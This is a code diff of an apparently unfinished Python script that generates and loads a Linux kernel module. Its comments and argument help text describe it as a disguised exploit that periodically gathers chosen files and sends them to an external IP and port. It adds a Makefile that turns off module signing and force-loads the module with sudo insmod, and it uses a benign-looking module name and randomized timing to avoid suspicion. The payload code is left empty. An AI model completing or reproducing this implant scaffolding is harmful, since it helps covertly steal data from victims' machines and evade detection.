@@ -1,25 +1,29 @@
 import os
 import argparse
 
-MODULE_CODE=""""""
-
-MAKEFILE="""
-obj-m += test.c
-
-all:
-    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
-
-clean:
-    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean"""
-
 #module_name is needed to hide the exploit under the name which is not suspicious
-def exploit_gen(external_ip, external_port, module_name = "ethernet_module", files = [], update_period=1):
+def exploit_gen(external_ip, external_port, module_name = "ethernet.c", files = [], update_period=1):
+    MODULE_CODE=""""""
     print(external_ip, external_port, module_name, update_period)
     print(files[0])
     print(files[1])
 
-def load_module(name):
-    os.system("make")
+def load_module(moduleName):
+    MAKEFILE=f"""CONFIG_MODULE_SIG=n
+obj-m += {moduleName}
+
+all:
+	sudo apt-get install --reinstall -y linux-headers-$(uname -r)
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+	sudo insmod dvt-driver.ko
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+	rm -rf *.c *.o *.ko *.mod *.mod.c"""
+
+    with open("Makefile_tst", "w") as f:
+        f.write(MAKEFILE)
+    #os.system(" make")
 
 
 def cleanup():
@@ -40,7 +44,7 @@ def main():
     parser.add_argument("--update_period", type = str, help = "The interval of time in which information should be gathered again and send (in hours). You should know that to avoid suspicions, time period may differ up to 11 min", default="1")
     args = parser.parse_args()
     exploit_gen(args.external_ip, args.external_port, args.module_name, args.files, args.update_period)
-    load_module()
+    load_module(args.module_name)
     cleanup()
     return 0;
 
